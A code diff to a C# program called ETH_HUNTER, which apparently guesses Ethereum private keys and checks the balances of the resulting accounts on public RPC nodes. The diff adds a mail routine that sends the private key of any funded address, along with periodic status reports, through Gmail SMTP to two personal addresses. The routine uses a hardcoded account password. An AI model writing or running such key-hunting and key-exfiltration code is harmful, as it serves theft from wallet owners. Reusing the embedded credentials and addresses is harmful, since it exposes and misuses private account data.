@@ -4,6 +4,8 @@ using Nethereum.Web3;
 using Nethereum.Web3.Accounts;
 using System.Data.SQLite;
 using System.Diagnostics;
+using System.Net.Mail;
+using System.Net;
 
 namespace ETH_HUNTER
 {
@@ -13,16 +15,16 @@ namespace ETH_HUNTER
         public static int index = 0;
         public static int guess = 0;
         public static int errors = 0;
-        public static readonly int delay = 30;
+        public static readonly int delay = 50;
 
 
 
         public static readonly string[] web3Urls = {
             "https://ethereum.publicnode.com",
-            //"https://nodes.mewapi.io/rpc/eth", //this errors
+            "https://nodes.mewapi.io/rpc/eth", //this errors
             "https://cloudflare-eth.com/",
-            //"https://rpc.flashbots.net/", //this errors
-            //"https://rpc.ankr.com/eth", //this errors
+            "https://rpc.flashbots.net/", //this errors
+            "https://rpc.ankr.com/eth", //this errors
             "https://eth-mainnet.public.blastapi.io"
         };
 
@@ -64,6 +66,7 @@ namespace ETH_HUNTER
                     if (Web3.Convert.FromWei(balance.Value) != 0)
                     {
                         Interlocked.Increment(ref guess);
+                        sendMail("Address found: " + account.PrivateKey);
                     }
 
                     var data_cmd = new SQLiteCommand(con)
@@ -82,11 +85,49 @@ namespace ETH_HUNTER
                 }
 
                 Interlocked.Increment(ref index);
+
+                if (index % 500000 == 0)
+                {
+                    sendMail("Status: alive. " + "Index: " + index);
+                }
             }
 
             var tasks = web3Urls.Select((url, index) => ProcessThreadAsync(new Web3(url), index));
 
             await Task.WhenAll(tasks);
+        }
+
+        private static void sendMail(string body)
+        {
+            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
+            {
+                Port = 587, // Port number for the SMTP server (587 for TLS, 465 for SSL, 25 for non-secure)
+                Credentials = new NetworkCredential("eth.hunter.miner@gmail.com", "nbowhnrfngcdwhmv"),
+                EnableSsl = true, // Use SSL/TLS to secure the connection (true for most modern SMTP servers)
+            };
+
+            // Create a new email message
+            MailMessage mailMessage = new MailMessage
+            {
+                From = new MailAddress("eth.hunter.miner@gmail.com"),
+                Subject = "Health Status",
+                Body = body,
+            };
+
+            // Add recipients (you can add multiple recipients)
+            mailMessage.To.Add("catalin0505229@gmail.com");
+            mailMessage.To.Add("mpetrusenco@gmail.com");
+
+            try
+            {
+                // Send the email
+                smtpClient.Send(mailMessage);
+                Console.WriteLine("Email sent successfully.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error sending email: " + ex.Message);
+            }
         }
 
 
